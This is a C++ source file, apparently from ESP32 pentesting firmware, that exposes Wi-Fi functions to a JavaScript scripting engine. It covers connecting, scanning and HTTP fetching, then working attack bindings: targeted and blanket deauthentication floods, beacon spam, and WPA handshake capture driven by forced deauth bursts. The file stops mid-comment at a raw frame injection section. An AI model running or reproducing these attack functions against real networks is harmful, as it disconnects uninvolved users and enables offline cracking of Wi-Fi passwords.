#if !defined(LITE_VERSION) && !defined(DISABLE_INTERPRETER)
#include "wifi_js.h"

#include "core/mykeyboard.h"
#include "core/sd_functions.h"
#include "core/wifi/webInterface.h"
#include "core/wifi/wifi_common.h"
#include "helpers_js.h"
#include "modules/wifi/sniffer.h"
#include "modules/wifi/wifi_atks.h"
#include "storage_js.h"
#include <ArduinoJson.h>
#include <HTTPClient.h>
#include <WiFi.h>
#include <esp_wifi.h>

static const char *wifi_enc_types[] = {
    "OPEN",
    "WEP",
    "WPA_PSK",
    "WPA2_PSK",
    "WPA_WPA2_PSK",
    "ENTERPRISE",
    "WPA2_ENTERPRISE",
    "WPA3_PSK",
    "WPA2_WPA3_PSK",
    "WAPI_PSK",
    "WPA3_ENT_192",
    "MAX"
};

JSValue native_wifiConnected(JSContext *ctx, JSValue *this_val, int argc, JSValue *argv) {
    return JS_NewBool(wifiConnected);
}

JSValue native_wifiConnectDialog(JSContext *ctx, JSValue *this_val, int argc, JSValue *argv) {
    bool connected = wifiConnectMenu();
    return JS_NewBool(connected);
}

JSValue native_wifiConnect(JSContext *ctx, JSValue *this_val, int argc, JSValue *argv) {
    if (argc < 1 || !JS_IsString(ctx, argv[0]))
        return JS_ThrowTypeError(ctx, "wifiConnect(ssid:string, timeout?:int, pwd?:string)");

    JSCStringBuf ssb;
    const char *ssid = JS_ToCString(ctx, argv[0], &ssb);
    int timeout_in_seconds = 10;
    if (argc > 1 && JS_IsNumber(ctx, argv[1])) JS_ToInt32(ctx, &timeout_in_seconds, argv[1]);

    bool r = false;
    Serial.println(String("Connecting to: ") + (ssid ? ssid : ""));

    // A script is a tight-memory place to bring Wi-Fi up, and BLE / the Web UI
    // may be holding the contiguous DMA block. Release them first; if the radio
    // still cannot fit, say so instead of crashing inside WiFi.begin().
    if (!wifiEnsureRadioMem()) {
        Serial.println("[RAM] not enough DMA memory for script WiFi connect");
        return JS_NewBool(false);
    }

    WiFi.mode(WIFI_MODE_STA);
    if (argc > 2 && JS_IsString(ctx, argv[2])) {
        JSCStringBuf psb;
        const char *pwd = JS_ToCString(ctx, argv[2], &psb);
        WiFi.begin(ssid, pwd);
    } else {
        WiFi.begin(ssid);
    }

    int i = 0;
    do {
        delay(1000);
        i++;
        if (i > timeout_in_seconds) {
            Serial.println("timeout");
            break;
        }
    } while (!WiFi.isConnected());

    if (WiFi.isConnected()) {
        r = true;
        wifiIP = WiFi.localIP().toString();
        wifiConnected = true;
    }

    return JS_NewBool(r);
}

JSValue native_wifiScan(JSContext *ctx, JSValue *this_val, int argc, JSValue *argv) {
    if (!wifiEnsureRadioMem()) {
        Serial.println("[RAM] not enough DMA memory for script WiFi scan");
        JSGCRef empty_ref;
        JSValue *empty = JS_PushGCRef(ctx, &empty_ref);
        *empty = JS_NewArray(ctx, 0);
        return JS_PopGCRef(ctx, &empty_ref);
    }
    WiFi.mode(WIFI_MODE_STA);
    int nets = WiFi.scanNetworks();

    // Same GC hazard as wifiGetCapturedPackets(): the result array and the entry
    // being built must be pinned in JSGCRefs, because each JS_NewString() below
    // can relocate the whole heap. See the longer comment in
    // native_wifiGetCapturedPackets for the full explanation.
    JSGCRef arr_ref;
    JSValue *arr = JS_PushGCRef(ctx, &arr_ref);
    *arr = JS_NewArray(ctx, nets);
    if (JS_IsException(*arr)) {
        JS_PopGCRef(ctx, &arr_ref);
        return JS_ThrowOutOfMemory(ctx);
    }

    uint32_t idx = 0;
    for (int i = 0; i < nets; i++) {
        JSGCRef obj_ref;
        JSValue *obj = JS_PushGCRef(ctx, &obj_ref);
        *obj = JS_NewObject(ctx);
        if (JS_IsException(*obj)) {
            JS_PopGCRef(ctx, &obj_ref);
            JS_PopGCRef(ctx, &arr_ref);
            return JS_EXCEPTION; // out of memory is already raised
        }

        int enctypeInt = int(WiFi.encryptionType(i));
        const char *enctype = enctypeInt < 12 ? wifi_enc_types[enctypeInt] : "UNKNOWN";
        JS_SetPropertyStr(ctx, *obj, "encryptionType", JS_NewString(ctx, enctype));
        JS_SetPropertyStr(ctx, *obj, "SSID", JS_NewString(ctx, WiFi.SSID(i).c_str()));
        JS_SetPropertyStr(ctx, *obj, "MAC", JS_NewString(ctx, WiFi.BSSIDstr(i).c_str()));
        JS_SetPropertyStr(ctx, *obj, "RSSI", JS_NewInt32(ctx, WiFi.RSSI(i)));
        JS_SetPropertyStr(ctx, *obj, "channel", JS_NewInt32(ctx, WiFi.channel(i)));
        JS_SetPropertyUint32(ctx, *arr, idx++, *obj);
        JS_PopGCRef(ctx, &obj_ref);
    }
    return JS_PopGCRef(ctx, &arr_ref);
}

JSValue native_wifiDisconnect(JSContext *ctx, JSValue *this_val, int argc, JSValue *argv) {
    wifiDisconnect();
    return JS_UNDEFINED;
}

JSValue native_httpFetch(JSContext *ctx, JSValue *this_val, int argc, JSValue *argv) {
    HTTPClient http;
    http.setReuse(false);

    JSCStringBuf stringBuffer;

    if (!WiFi.isConnected()) wifiConnectMenu();
    if (!WiFi.isConnected()) return JS_ThrowTypeError(ctx, "WIFI Not Connected");

    if (argc < 1 || !JS_IsString(ctx, argv[0]))
        return JS_ThrowTypeError(ctx, "httpFetch(url:string, options?:object|headers?:array)");

    const char *url = JS_ToCString(ctx, argv[0], &stringBuffer);
    http.begin(url);

    // handle headers if a simple array of pairs was passed as second arg
    if (argc > 1 && JS_GetClassID(ctx, argv[1]) == JS_CLASS_ARRAY) {
        JSValue jsvArrayLength = JS_GetPropertyStr(ctx, argv[1], "length");
        if (JS_IsNumber(ctx, jsvArrayLength)) {
            uint32_t arrayLength = 0;
            JS_ToUint32(ctx, &arrayLength, jsvArrayLength);
            for (uint32_t i = 0; i + 1 < arrayLength; i += 2) {
                JSValue jsvKey = JS_GetPropertyUint32(ctx, argv[1], i);
                JSValue jsvValue = JS_GetPropertyUint32(ctx, argv[1], i + 1);
                if (JS_IsString(ctx, jsvKey) && JS_IsString(ctx, jsvValue)) {
                    // Copy both out at once. JS_ToCString() returns a pointer into
                    // the movable heap, and sharing one JSCStringBuf between the
                    // two calls also lets the second clobber the first.
                    String key = js_tocstring_copy(ctx, jsvKey);
                    String value = js_tocstring_copy(ctx, jsvValue);
                    http.addHeader(key.c_str(), value.c_str());
                }
            }
        }
    }

    // options object handling (body, method, responseType, headers)
    // These three outlive the JSON sendRequest() call at the bottom of this
    // function, so they are owned by Strings rather than by borrowed pointers
    // into the movable JS heap.
    String bodyRequestStore;
    const char *bodyRequest = NULL;
    size_t bodyRequestLength = 0U;
    String requestTypeStore = "GET";
    const char *requestType = requestTypeStore.c_str();
    uint8_t returnResponseType = 0; // 0 = string, 1 = arraybuffer, 2 = json

    if (argc > 1 && JS_IsObject(ctx, argv[1])) {
        JSValue jsvBody = JS_GetPropertyStr(ctx, argv[1], "body");
        if (!JS_IsUndefined(jsvBody)) {
            if (JS_IsString(ctx, jsvBody) || JS_IsNumber(ctx, jsvBody) || JS_IsBool(jsvBody)) {
                bodyRequestStore = js_tocstring_copy(ctx, jsvBody);
            } else if (JS_IsObject(ctx, jsvBody)) {
                JSValue global = JS_GetGlobalObject(ctx);
                JSValue json = JS_GetPropertyStr(ctx, global, "JSON");
                JSValue stringify = JS_GetPropertyStr(ctx, json, "stringify");
                if (JS_IsFunction(ctx, stringify)) {
                    JS_PushArg(ctx, jsvBody);
                    JS_PushArg(ctx, stringify);
                    JS_PushArg(ctx, json);
                    JSValue jsvBodyRequest = JS_Call(ctx, 1);
                    if (!JS_IsException(jsvBodyRequest) &&
                        (JS_IsString(ctx, jsvBodyRequest) || JS_IsNumber(ctx, jsvBodyRequest) ||
                         JS_IsBool(jsvBodyRequest))) {
                        bodyRequestStore = js_tocstring_copy(ctx, jsvBodyRequest);
                    }
                }
            }
            // Only non-empty bodies are sent, matching the old NULL check.
            bodyRequest = bodyRequestStore.length() > 0 ? bodyRequestStore.c_str() : NULL;
            bodyRequestLength = bodyRequest == NULL ? 0U : bodyRequestStore.length();
        }

        JSValue jsvMethod = JS_GetPropertyStr(ctx, argv[1], "method");
        if (!JS_IsUndefined(jsvMethod) && JS_IsString(ctx, jsvMethod)) {
            requestTypeStore = js_tocstring_copy(ctx, jsvMethod);
            requestType = requestTypeStore.c_str();
        }

        JSValue jsvResponseType = JS_GetPropertyStr(ctx, argv[1], "responseType");
        if (!JS_IsUndefined(jsvResponseType) && JS_IsString(ctx, jsvResponseType)) {
            String responseType = js_tocstring_copy(ctx, jsvResponseType);
            if (responseType == "binary") {
                returnResponseType = 1;
            } else if (responseType == "json") {
                returnResponseType = 2;
            }
        }

        // headers inside options
        JSValue jsvHeaders = JS_GetPropertyStr(ctx, argv[1], "headers");
        if (!JS_IsUndefined(jsvHeaders)) {
            if (JS_GetClassID(ctx, jsvHeaders) == JS_CLASS_ARRAY) {
                JSValue l = JS_GetPropertyStr(ctx, jsvHeaders, "length");
                if (JS_IsNumber(ctx, l)) {
                    uint32_t len = 0;
                    JS_ToUint32(ctx, &len, l);
                    for (uint32_t i = 0; i + 1 < len; i += 2) {
                        JSValue jsvKey = JS_GetPropertyUint32(ctx, jsvHeaders, i);
                        JSValue jsvValue = JS_GetPropertyUint32(ctx, jsvHeaders, i + 1);
                        if (JS_IsString(ctx, jsvKey) && JS_IsString(ctx, jsvValue)) {
                            String key = js_tocstring_copy(ctx, jsvKey);
                            String value = js_tocstring_copy(ctx, jsvValue);
                            http.addHeader(key.c_str(), value.c_str());
                        }
                    }
                }
            } else if (JS_IsObject(ctx, jsvHeaders)) {
                // jsvHeaders is walked repeatedly, and both calls below allocate,
                // so it has to be a GC root for the duration of the loop.
                JSGCRef jsvHeaders_ref;
                JSValue *headers = JS_PushGCRef(ctx, &jsvHeaders_ref);
                *headers = jsvHeaders;
                uint32_t prop_count = 0;
                for (uint32_t index = 0;; ++index) {
                    const char *keyRaw = JS_GetOwnPropertyByIndex(ctx, index, &prop_count, *headers);
                    if (keyRaw == NULL) break;
                    // JS_GetOwnPropertyByIndex() returns JS_ToCString() over a
                    // JSCStringBuf that is local to itself, so for a short name
                    // ("Host", "Date", ...) the pointer is already dangling the
                    // moment it returns. Copy immediately, before any engine call.
                    String key = keyRaw;
                    JSValue hv = JS_GetPropertyStr(ctx, *headers, key.c_str());
                    if (!JS_IsUndefined(hv) &&
                        (JS_IsString(ctx, hv) || JS_IsNumber(ctx, hv) || JS_IsBool(hv))) {
                        String val = js_tocstring_copy(ctx, hv);
                        http.addHeader(key.c_str(), val.c_str());
                    }
                }
                JS_PopGCRef(ctx, &jsvHeaders_ref);
            }
        }
    }

    http.collectAllHeaders(true);

    // Send HTTP request
    // MEMO: Docs is wrong: sendRequest returns httpResponseCode not
    // Content-Length
    int httpResponseCode = http.sendRequest(requestType, (uint8_t *)bodyRequest, bodyRequestLength);
    if (httpResponseCode <= 0) {
        return JS_ThrowInternalError(ctx, http.errorToString(httpResponseCode).c_str());
    }

    WiFiClient *stream = http.getStreamPtr();

    int contentLength = http.getSize();
    bool isChunked = false;
    if (contentLength == -1) {
        String transferEncoding = http.header("transfer-encoding");
        isChunked = transferEncoding.equalsIgnoreCase("chunked");
    }

    bool psramFoundValue = psramFound();

    size_t payloadCap = 1; // MEMO: 1 for null terminated string
    char *payload = NULL;
    if (!isChunked) {
        payloadCap = contentLength < 1 ? (psramFoundValue ? 16384 : 4096) : (size_t)contentLength + 1;
        payload = (char *)(psramFoundValue ? ps_malloc(payloadCap) : malloc(payloadCap));
        if (payload == NULL) {
            http.end();
            return JS_ThrowInternalError(ctx, "httpFetch: Memory allocation failed!");
        }
    }

    unsigned long startMillis = millis();
    const unsigned long timeoutMillis = 30000;

    size_t bytesRead = 0;
    while (http.connected()) {
        if (millis() - startMillis > timeoutMillis) {
            Serial.println("Timeout while reading response!");
            break;
        }

        if (isChunked) { // if header Transfer-Encoding: chunked
            // Read chunk size
            String chunkSizeStr = stream->readStringUntil('\r');
            stream->read();                                         // Consume '\n'
            int chunkSize = strtol(chunkSizeStr.c_str(), NULL, 16); // Convert hex to int
            if (chunkSize == 0) break;                              // Last chunk
            contentLength += chunkSize;
            if (payload == NULL) {
                payloadCap = (size_t)contentLength + 1;
                payload = (char *)(psramFoundValue ? ps_malloc(payloadCap) : malloc(payloadCap));
            } else {
                payloadCap = (size_t)contentLength + 1;
                payload = (char *)(psramFoundValue ? ps_realloc(payload, payloadCap)
                                                   : realloc(payload, payloadCap));
            }
            if (payload == NULL) {
                http.end();
                return JS_ThrowInternalError(ctx, "httpFetch: Memory allocation failed!");
            }
            // Read chunk data
            int toRead = chunkSize;
            while (toRead > 0) {
                int readNow = stream->readBytes(payload + bytesRead, toRead);
                if (readNow <= 0) break;
                bytesRead += readNow;
                toRead -= readNow;
            }
            // Consume trailing "\r\n" after chunk
            stream->read();
            stream->read();
        } else {
            int streamSize = stream->available();
            if (streamSize > 0) {
                size_t toRead = (streamSize > 512) ? 512 : streamSize;
                if ((bytesRead + toRead + 1) > payloadCap) break;
                int bytesReceived = stream->readBytes(payload + bytesRead, toRead);
                bytesRead += bytesReceived;
            } else {
                delay(1);
            }
            if ((bytesRead + 1) >= payloadCap) break;
        }
        delay(1);
    }

    // GC hazard: mquickjs compacts its heap on allocation and only relocates the
    // roots it knows about (the JS value stack and JSGCRef chains). Every
    // JS_New*()/JS_SetProperty*() below can therefore invalidate a plain C local.
    // See the long comment in native_wifiGetCapturedPackets() for the full story.
    JSGCRef headersObj_ref;
    JSValue *headersObj = JS_PushGCRef(ctx, &headersObj_ref);
    *headersObj = JS_NewObject(ctx);
    if (JS_IsException(*headersObj)) {
        free(payload);
        http.end();
        JS_PopGCRef(ctx, &headersObj_ref);
        return JS_ThrowOutOfMemory(ctx);
    }

    for (size_t i = 0; i < http.headers(); i++) {
        JS_SetPropertyStr(
            ctx, *headersObj, http.headerName(i).c_str(), JS_NewString(ctx, http.header(i).c_str())
        );
    }

    JSGCRef obj_ref;
    JSValue *obj = JS_PushGCRef(ctx, &obj_ref);
    *obj = JS_NewObject(ctx);
    if (JS_IsException(*obj)) {
        free(payload);
        http.end();
        JS_PopGCRef(ctx, &obj_ref);
        JS_PopGCRef(ctx, &headersObj_ref);
        return JS_ThrowOutOfMemory(ctx);
    }

    // Check if save option is present
    bool hasSave = false;
    if (argc > 1 && JS_IsObject(ctx, argv[1])) {
        JSValue jsvSave = JS_GetPropertyStr(ctx, argv[1], "save");
        hasSave = !JS_IsUndefined(jsvSave);
    }

    // Only set body property if save is not specified
    if (!hasSave) {
        if (returnResponseType == 0) {
            JS_SetPropertyStr(ctx, *obj, "body", JS_NewStringLen(ctx, (const char *)payload, bytesRead));
        } else if (returnResponseType == 1) {
            JS_SetPropertyStr(
                ctx, *obj, "body", JS_NewUint8ArrayCopy(ctx, (const uint8_t *)payload, bytesRead)
            );
        } else {
            JsonDocument doc;
            DeserializationError error = deserializeJson(doc, payload, bytesRead);
            if (error) {
                free(payload);
                http.end();
                JS_PopGCRef(ctx, &obj_ref);
                JS_PopGCRef(ctx, &headersObj_ref);
                return JS_ThrowInternalError(ctx, "deserializeJson failed: %s", error.c_str());
            }
            JS_SetPropertyStr(ctx, *obj, "body", js_value_from_json_variant(ctx, doc.as<JsonVariantConst>()));
        }
    }

    // Handle save option
    if (argc > 1 && JS_IsObject(ctx, argv[1])) {
        JSGCRef jsvSave_ref;
        JSValue *jsvSave = JS_PushGCRef(ctx, &jsvSave_ref);
        *jsvSave = JS_GetPropertyStr(ctx, argv[1], "save");
        if (!JS_IsUndefined(*jsvSave)) {
            // The staging slots for native_storageWrite are pinned too, since
            // building them allocates (and the callee can allocate again).
            JSGCRef argRefs[4];
            JSValue *argSlots[4];
            for (int k = 0; k < 4; k++) {
                argSlots[k] = JS_PushGCRef(ctx, &argRefs[k]);
                *argSlots[k] = JS_UNDEFINED;
            }
            int storageArgc = 2; // path and data are required

            // Set path argument
            *argSlots[0] = *jsvSave; // This handles both string and object forms

            // Set data argument - create JSValue from payload
            JSGCRef data_ref;
            JSValue *data = JS_PushGCRef(ctx, &data_ref);
            *data = JS_NewStringLen(ctx, (const char *)payload, bytesRead);

            // Handle optional mode and position from save object
            if (JS_IsObject(ctx, *jsvSave)) {
                JSGCRef jsvMode_ref;
                JSValue *jsvMode = JS_PushGCRef(ctx, &jsvMode_ref);
                *jsvMode = JS_GetPropertyStr(ctx, *jsvSave, "mode");
                if (!JS_IsUndefined(*jsvMode) && JS_IsString(ctx, *jsvMode)) {
                    *argSlots[2] = *jsvMode;
                    storageArgc = 3;

                    JSGCRef jsvPosition_ref;
                    JSValue *jsvPosition = JS_PushGCRef(ctx, &jsvPosition_ref);
                    *jsvPosition = JS_GetPropertyStr(ctx, *jsvSave, "position");
                    if (!JS_IsUndefined(*jsvPosition) &&
                        (JS_IsNumber(ctx, *jsvPosition) || JS_IsString(ctx, *jsvPosition))) {
                        *argSlots[3] = *jsvPosition;
                        storageArgc = 4;
                    }
                    JS_PopGCRef(ctx, &jsvPosition_ref);
                }
                JS_PopGCRef(ctx, &jsvMode_ref);
            }

            // Refresh the contiguous argv from the pinned slots right before the
            // call, so every element is a current (post-compaction) pointer.
            JSValue storageWriteArgs[4];
            storageWriteArgs[0] = *argSlots[0];
            storageWriteArgs[1] = *data;
            storageWriteArgs[2] = *argSlots[2];
            storageWriteArgs[3] = *argSlots[3];

            // Call native_storageWrite
            JSValue writeResult = native_storageWrite(ctx, this_val, storageArgc, storageWriteArgs);
            bool saveSuccess = JS_ToBool(ctx, writeResult);

            JS_PopGCRef(ctx, &data_ref);
            JS_PopGCRef(ctx, &argRefs[3]);
            JS_PopGCRef(ctx, &argRefs[2]);
            JS_PopGCRef(ctx, &argRefs[1]);
            JS_PopGCRef(ctx, &argRefs[0]);

            // Get the actual saved path for response
            FileParamsJS fileParams;
            JSValue tempArgv[1] = {*jsvSave};
            fileParams = js_get_path_from_params(ctx, tempArgv, true);
            if (!fileParams.path.startsWith("/")) fileParams.path = "/" + fileParams.path;

            JS_SetPropertyStr(ctx, *obj, "saved", JS_NewBool(saveSuccess));
            JS_SetPropertyStr(ctx, *obj, "savedPath", JS_NewString(ctx, fileParams.path.c_str()));
        }
        JS_PopGCRef(ctx, &jsvSave_ref);
    }

    free(payload);
    JS_SetPropertyStr(ctx, *obj, "length", JS_NewInt32(ctx, contentLength));
    JS_SetPropertyStr(ctx, *obj, "headers", *headersObj);
    JS_SetPropertyStr(ctx, *obj, "response", JS_NewInt32(ctx, httpResponseCode));
    JS_SetPropertyStr(ctx, *obj, "status", JS_NewInt32(ctx, httpResponseCode));
    JS_SetPropertyStr(ctx, *obj, "ok", JS_NewBool(httpResponseCode >= 200 && httpResponseCode < 300));

    http.end();
    JSValue result = JS_PopGCRef(ctx, &obj_ref);
    JS_PopGCRef(ctx, &headersObj_ref);
    return result;
}

JSValue native_wifiMACAddress(JSContext *ctx, JSValue *this_val, int argc, JSValue *argv) {
    String macAddress = WiFi.macAddress();
    return JS_NewString(ctx, macAddress.c_str());
}

JSValue native_ipAddress(JSContext *ctx, JSValue *this_val, int argc, JSValue *argv) {
    if (wifiConnected) {
        String ipAddress = WiFi.localIP().toString();
        return JS_NewString(ctx, ipAddress.c_str());
    }
    return JS_NULL;
}

// ============================================================================
// WiFi attack bindings.
//
// The on-screen attack menus block until a button is pressed, so they cannot
// be called from a script. These bindings drive the same primitives but stop
// on a deadline, which lets a BruceScript run them. Every entry point returns
// at the requested time, and BACK/ESC still aborts early.
// ============================================================================

static bool js_parse_bssid(const char *str, uint8_t out[6]) {
    if (str == NULL) return false;

    unsigned int b[6];
    bool parsed = sscanf(str, "%x:%x:%x:%x:%x:%x", &b[0], &b[1], &b[2], &b[3], &b[4], &b[5]) == 6;
    if (!parsed) {
        parsed = sscanf(str, "%2x%2x%2x%2x%2x%2x", &b[0], &b[1], &b[2], &b[3], &b[4], &b[5]) == 6;
    }
    if (!parsed) return false;

    for (int i = 0; i < 6; i++) {
        if (b[i] > 0xFF) return false;
        out[i] = (uint8_t)b[i];
    }
    return true;
}

static int js_clamped_seconds(JSContext *ctx, JSValue *argv, int argc, int index, int fallback) {
    int seconds = fallback;
    if (argc > index && JS_IsNumber(ctx, argv[index])) JS_ToInt32(ctx, &seconds, argv[index]);
    if (seconds < 1) seconds = 1;
    if (seconds > 300) seconds = 300;
    return seconds;
}

JSValue native_wifiDeauth(JSContext *ctx, JSValue *this_val, int argc, JSValue *argv) {
    // usage: wifi.deauth(bssid: string, channel?: int, seconds?: int)
    // returns: number of raw deauth frames sent
    if (argc < 1 || !JS_IsString(ctx, argv[0]))
        return JS_ThrowTypeError(ctx, "wifiDeauth(bssid:string, channel?:int, seconds?:int)");

    JSCStringBuf bb;
    const char *bssidStr = JS_ToCString(ctx, argv[0], &bb);
    uint8_t bssid[6];
    if (!js_parse_bssid(bssidStr, bssid))
        return JS_ThrowTypeError(ctx, "wifiDeauth: invalid bssid, expected AA:BB:CC:DD:EE:FF");

    int channel = 1;
    if (argc > 1 && JS_IsNumber(ctx, argv[1])) JS_ToInt32(ctx, &channel, argv[1]);
    if (channel < 1 || channel > 14) channel = 1;
    int seconds = js_clamped_seconds(ctx, argv, argc, 2, 10);

    cleanlyStopWebUiForWiFiFeature();
    if (!wifi_atk_setWifi()) { return JS_NewInt32(ctx, 0); }

    memcpy(ap_record.bssid, bssid, 6);
    ap_record.primary = (uint8_t)channel;
    memcpy(deauth_frame, deauth_frame_default, sizeof(deauth_frame_default));

    uint32_t frames = 0;
    uint32_t deadline = millis() + ((uint32_t)seconds * 1000);
    while ((int32_t)(deadline - millis()) > 0) {
        wsl_bypasser_send_raw_frame(&ap_record, (uint8_t)channel, _default_target);
        for (int i = 0; i < 20; i++) {
            send_raw_frame(deauth_frame, sizeof(deauth_frame_default));
            frames += 3; // send_raw_frame() transmits the frame three times
            if (EscPress) break;
        }
        if (check(EscPress)) break;
        vTaskDelay(10 / portTICK_PERIOD_MS);
    }

    wifi_atk_unsetWifi();
    return JS_NewInt32(ctx, (int)frames);
}

JSValue native_wifiDeauthAll(JSContext *ctx, JSValue *this_val, int argc, JSValue *argv) {
    // usage: wifi.deauthAll(seconds?: int, channel?: int)
    // Scans for nearby APs and floods them with deauth frames.
    // returns: number of raw deauth frames sent
    int seconds = js_clamped_seconds(ctx, argv, argc, 0, 10);
    int onlyChannel = 0;
    if (argc > 1 && JS_IsNumber(ctx, argv[1])) JS_ToInt32(ctx, &onlyChannel, argv[1]);
    if (onlyChannel < 0 || onlyChannel > 14) onlyChannel = 0;

    cleanlyStopWebUiForWiFiFeature();
    if (!wifi_atk_setWifi()) { return JS_NewInt32(ctx, 0); }

    const int MAX_APS = 24;
    uint8_t macs[MAX_APS][6];
    uint8_t chans[MAX_APS];
    int n = 0;

    int nets = WiFi.scanNetworks(false, true);
    for (int i = 0; i < nets && n < MAX_APS; i++) {
        int ch = WiFi.channel(i);
        if (onlyChannel != 0 && ch != onlyChannel) continue;
        memcpy(macs[n], WiFi.BSSID(i), 6);
        chans[n] = (uint8_t)ch;
        n++;
    }
    WiFi.scanDelete();

    uint32_t frames = 0;
    if (n > 0) {
        memcpy(deauth_frame, deauth_frame_default, sizeof(deauth_frame_default));
        uint32_t deadline = millis() + ((uint32_t)seconds * 1000);
        while ((int32_t)(deadline - millis()) > 0) {
            for (int i = 0; i < n; i++) {
                memcpy(ap_record.bssid, macs[i], 6);
                ap_record.primary = chans[i];
                wsl_bypasser_send_raw_frame(&ap_record, chans[i], _default_target);
                for (int k = 0; k < 10; k++) {
                    send_raw_frame(deauth_frame, sizeof(deauth_frame_default));
                    frames += 3;
                    if (EscPress) break;
                }
                if ((int32_t)(deadline - millis()) <= 0) break;
            }
            if (check(EscPress)) break;
        }
    }

    wifi_atk_unsetWifi();
    return JS_NewInt32(ctx, (int)frames);
}

JSValue native_wifiBeaconSpam(JSContext *ctx, JSValue *this_val, int argc, JSValue *argv) {
    // usage: wifi.beaconSpam(mode?: int, seconds?: int, ssid?: string)
    //   mode 0 = funny SSID list, 1 = rickroll list, 2 = random SSIDs,
    //   4 = single SSID (ssid followed by a counter)
    // returns: number of beacon frames sent
    int mode = 0;
    if (argc > 0 && JS_IsNumber(ctx, argv[0])) JS_ToInt32(ctx, &mode, argv[0]);
    if (mode != 0 && mode != 1 && mode != 2 && mode != 4) mode = 0;

    int seconds = js_clamped_seconds(ctx, argv, argc, 1, 10);

    String ssid = "";
    if (argc > 2 && JS_IsString(ctx, argv[2])) {
        JSCStringBuf sb;
        const char *s = JS_ToCString(ctx, argv[2], &sb);
        if (s != NULL) ssid = s;
    }
    if (mode == 4 && ssid.length() == 0) ssid = "BruceBeacon";

    cleanlyStopWebUiForWiFiFeature();
    int frames = headlessBeaconSpam((uint8_t)mode, ssid, (uint32_t)seconds * 1000);
    return JS_NewInt32(ctx, frames);
}

JSValue native_wifiSniffHandshake(JSContext *ctx, JSValue *this_val, int argc, JSValue *argv) {
    // usage: wifi.sniffHandshake(bssid: string, channel?: int, seconds?: int, ssid?: string)
    // Captures a WPA handshake for the given AP, using deauth bursts to force a
    // re-connection. Captured handshakes are written by the sniffer itself.
    // returns: { captured, eapol, deauth_frames, msg1, msg2, msg3, msg4, ssid, error? }
    if (argc < 1 || !JS_IsString(ctx, argv[0]))
        return JS_ThrowTypeError(ctx, "wifiSniffHandshake(bssid:string, channel?:int, seconds?:int, ssid?:string)");

    JSCStringBuf bb;
    const char *bssidStr = JS_ToCString(ctx, argv[0], &bb);
    uint8_t bssid[6];
    if (!js_parse_bssid(bssidStr, bssid))
        return JS_ThrowTypeError(ctx, "wifiSniffHandshake: invalid bssid, expected AA:BB:CC:DD:EE:FF");

    int channel = 1;
    if (argc > 1 && JS_IsNumber(ctx, argv[1])) JS_ToInt32(ctx, &channel, argv[1]);
    if (channel < 1 || channel > 14) channel = 1;
    int seconds = js_clamped_seconds(ctx, argv, argc, 2, 30);

    String ssid = "unknown";
    if (argc > 3 && JS_IsString(ctx, argv[3])) {
        JSCStringBuf sb;
        const char *s = JS_ToCString(ctx, argv[3], &sb);
        if (s != NULL) ssid = s;
    }

    auto make_result = [&](const char *error) {
        // Pinned: every JS_SetPropertyStr() below allocates, which can compact
        // the heap and invalidate a plain local. See native_wifiGetCapturedPackets().
        JSGCRef obj_ref;
        JSValue *obj = JS_PushGCRef(ctx, &obj_ref);
        *obj = JS_NewObject(ctx);
        if (JS_IsException(*obj)) {
            JS_PopGCRef(ctx, &obj_ref);
            return JS_ThrowOutOfMemory(ctx);
        }
        JS_SetPropertyStr(ctx, *obj, "captured", JS_NewBool(handshakeUsable(hsTracker)));
        JS_SetPropertyStr(ctx, *obj, "eapol", JS_NewInt32(ctx, num_EAPOL));
        JS_SetPropertyStr(ctx, *obj, "deauth_frames", JS_NewInt32(ctx, 0));
        JS_SetPropertyStr(ctx, *obj, "msg1", JS_NewBool(hsTracker.msg1));
        JS_SetPropertyStr(ctx, *obj, "msg2", JS_NewBool(hsTracker.msg2));
        JS_SetPropertyStr(ctx, *obj, "msg3", JS_NewBool(hsTracker.msg3));
        JS_SetPropertyStr(ctx, *obj, "msg4", JS_NewBool(hsTracker.msg4));
        JS_SetPropertyStr(ctx, *obj, "ssid", JS_NewString(ctx, ssid.c_str()));
        if (error != NULL) JS_SetPropertyStr(ctx, *obj, "error", JS_NewString(ctx, error));
        return JS_PopGCRef(ctx, &obj_ref);
    };

    cleanlyStopWebUiForWiFiFeature();
    hsTracker = HandshakeTracker();

    bool sdDetected = setupSdCard();
    FS *fs = &LittleFS;
    if (sdDetected) fs = &SD;
    isLittleFS = !sdDetected;

    if (!fs->exists("/BrucePCAP")) fs->mkdir("/BrucePCAP");
    if (!fs->exists("/BrucePCAP/handshakes")) fs->mkdir("/BrucePCAP/handshakes");

    wifi_complete_cleanup();
    if (!WiFi.mode(WIFI_MODE_APSTA)) { return make_result("failed to start WiFi in AP+STA mode"); }
    vTaskDelay(100 / portTICK_PERIOD_MS);
    esp_wifi_set_storage(WIFI_STORAGE_RAM);

    if (!sniffer_prepare_storage(fs, sdDetected)) {
        wifi_complete_cleanup();
        return make_result("sniffer queue error");
    }

    memcpy(ap_record.bssid, bssid, 6);
    ap_record.primary = (uint8_t)channel;
    memcpy(targetBssid, bssid, 6);
    memcpy(deauth_frame, deauth_frame_default, sizeof(deauth_frame_default));

    ch = (uint8_t)channel;
    esp_wifi_set_promiscuous(true);
    esp_wifi_set_promiscuous_rx_cb(sniffer);
    esp_wifi_set_channel((uint8_t)channel, WIFI_SECOND_CHAN_NONE);

    uint32_t deauthFrames = 0;
    uint32_t deadline = millis() + ((uint32_t)seconds * 1000);
    uint32_t lastBurst = millis() - 10000; // force a burst right away

    while ((int32_t)(deadline - millis()) > 0) {
        if (!handshakeUsable(hsTracker) && (millis() - lastBurst) >= 10000) {
            wsl_bypasser_send_raw_frame(&ap_record, (uint8_t)channel, _default_target);
            for (int i = 0; i < 5; i++) {
                send_raw_frame(deauth_frame, sizeof(deauth_frame_default));
                deauthFrames += 3;
                vTaskDelay(10 / portTICK_PERIOD_MS);
            }
            lastBurst = millis();
        }
        if (check(EscPress)) break;
        vTaskDelay(50 / portTICK_PERIOD_MS);
    }

    sniffer_wait_for_flush(2000);
    esp_wifi_set_promiscuous(false);
    esp_wifi_set_promiscuous_rx_cb(NULL);
    esp_wifi_stop();

    JSGCRef obj_ref;
    JSValue *obj = JS_PushGCRef(ctx, &obj_ref);
    *obj = make_result(NULL);
    JS_SetPropertyStr(ctx, *obj, "deauth_frames", JS_NewInt32(ctx, (int)deauthFrames));
    return JS_PopGCRef(ctx, &obj_ref);
}

// ============================================================================
// Raw 802.11 injection / capture bindings.
//
// Thin wrappers over the engine in modules/wifi/wifi_atks.cpp, which drives
// esp_wifi_80211_tx() and promiscuous mode directly. The frame payloads are
